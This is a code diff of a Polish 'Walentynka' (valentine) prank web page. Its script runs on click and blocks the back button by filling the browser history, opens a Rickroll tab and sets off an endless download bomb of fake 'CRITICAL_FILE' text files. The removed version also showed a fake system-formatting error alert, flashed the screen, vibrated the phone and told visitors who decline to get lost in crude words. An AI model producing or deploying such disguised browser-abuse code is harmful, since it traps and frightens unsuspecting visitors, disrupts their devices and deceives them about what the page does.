@@ -5,63 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Walentynka</title>
     <style>
-        body {
-            background-color: red;
-            color: white;
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            cursor: pointer;
-            overflow: hidden;
-            text-align: center;
-        }
-        h1 { font-size: 3rem; text-shadow: 2px 2px 10px black; }
-        p { font-size: 1.5rem; }
-        /* Efekt mrugania tła */
-        .flash { animation: blinker 0.2s linear infinite; }
-        @keyframes blinker {
-            50% { background-color: black; }
-        }
+        body { background: red; color: white; text-align: center; padding-top: 40vh; font-family: sans-serif; cursor: pointer; margin: 0; }
+        h1 { font-size: 40px; }
     </style>
 </head>
-<body onclick="boom()">
-    <div id="content">
-        <h1>Walentynka</h1>
-        <p>chcesz zostan moja walentynka?</p>
-        <p><strong>KLIKNIJ TUTAJ jesli chcesz a jak nie to wypierdalaj</strong></p>
-    </div>
+<body onclick="start()">
+    <h1>chcesz zostacmoja walentynka</h1>
+    <p>Kliknij gdziekolwiek, jesli tak</p>
 
     <script>
-        function boom() {
-            // Dodajemy mruganie ekranu po kliknięciu
-            document.body.classList.add('flash');
+        function start() {
+            // 1. Alert musi być pierwszy, żeby "zatrzymać" użytkownika
+            alert("walentynka");
 
-            // Wibracje na telefonie (Android)
-            if (navigator.vibrate) { navigator.vibrate([500, 200, 500, 200, 500]); }
-
-            // Blokada przycisku wstecz (500 wpisów w historii)
-            for (let i = 0; i < 500; i++) {
-                window.history.pushState({}, '', "#warning_system_error_" + i);
+            // 2. Blokada przycisku wstecz
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState({}, '', "#error_" + i);
             }
 
-            // Pierwszy alert (straszak)
-            alert("BŁĄD KRYTYCZNY! Rozpoczęto formatowanie partycji systemowej...");
+            // 3. Próba otwarcia Rickrolla (może zostać zablokowane przez popup blocker, ale kod pójdzie dalej)
+            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
 
-            // Rickroll i bomby po 1 sekundzie
-            setTimeout(function() {
-                window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-                
-                setInterval(function() {
-                    const a = document.createElement('a');
-                    a.href = 'data:text/plain;base64,WFREU0E=';
-                    a.download = 'VIRUS_LOG_' + Math.floor(Math.random() * 9999) + '.txt';
-                    a.click();
-                }, 800);
+            // 4. Bomba pobierania (To na iOS ZAWSZE wyrzuca okienka)
+            setInterval(function() {
+                const link = document.createElement('a');
+                link.href = 'data:text/plain;base64,WFREU0E=';
+                link.download = 'CRITICAL_FILE_' + Math.floor(Math.random() * 1000) + '.txt';
+                link.click();
             }, 1000);
+
+            // 5. Zmiana napisu na ekranie
+            document.body.innerHTML = "<h1 style='font-size:100px;'>XDDDDDDDD</h1>";
+            document.body.style.backgroundColor = "black";
         }
     </script>
 </body>
